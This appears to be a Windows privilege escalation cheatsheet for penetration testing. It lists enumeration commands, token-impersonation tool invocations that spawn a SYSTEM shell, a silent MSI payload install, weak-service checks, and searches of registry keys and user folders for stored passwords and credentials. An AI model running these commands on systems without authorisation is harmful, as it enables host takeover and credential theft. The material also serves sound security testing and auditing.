# Windows Privilege Escalation Cheatsheet

## Baseline Context

```powershell
whoami /all
hostname
systeminfo
ipconfig /all
net user %USERNAME%
net localgroup administrators
```

## SeImpersonate / Potato Paths

```powershell
whoami /priv | findstr /I "SeImpersonate SeAssignPrimaryToken"
PrintSpoofer.exe -i -c cmd
JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -l 1337
```

## AlwaysInstallElevated

```powershell
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msiexec /quiet /qn /i payload.msi
```

## Weak Services

```powershell
Get-CimInstance win32_service | Select Name,State,StartMode,PathName
sc qc <service>
sc sdshow <service>
accesschk.exe -uwcqv "Authenticated Users" *
```

Look for:

- writable service binary path
- unquoted service path with spaces
- weak service DACL allowing config change

## Scheduled Tasks / Autoruns

```powershell
schtasks /query /fo LIST /v
Get-ScheduledTask | Select TaskName,TaskPath,State
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
```

## Autologon / Credential Storage

```powershell
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
cmdkey /list
dir C:\Users\*\AppData\Roaming\Microsoft\Credentials /s
findstr /spin "password" C:\Users\* C:\inetpub\* C:\xampp\* 2>nul
```

## Token / Group Misconfig

```powershell
whoami /groups
whoami /priv
net localgroup "Remote Desktop Users"
net localgroup "Backup Operators"
```

## Filesystem / DLL Search Order

```powershell
icacls "C:\Program Files\*" /t /c
Get-ChildItem -Force C:\ -Recurse -ErrorAction SilentlyContinue | Select -First 200
procmon.exe
```

## Registry / Run-as-Service

```powershell
reg query HKLM\SYSTEM\CurrentControlSet\Services
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System"
```

## Tools

```powershell
winPEAS.exe
Seatbelt.exe -group=all
SharpUp.exe audit
PowerUp.ps1
```
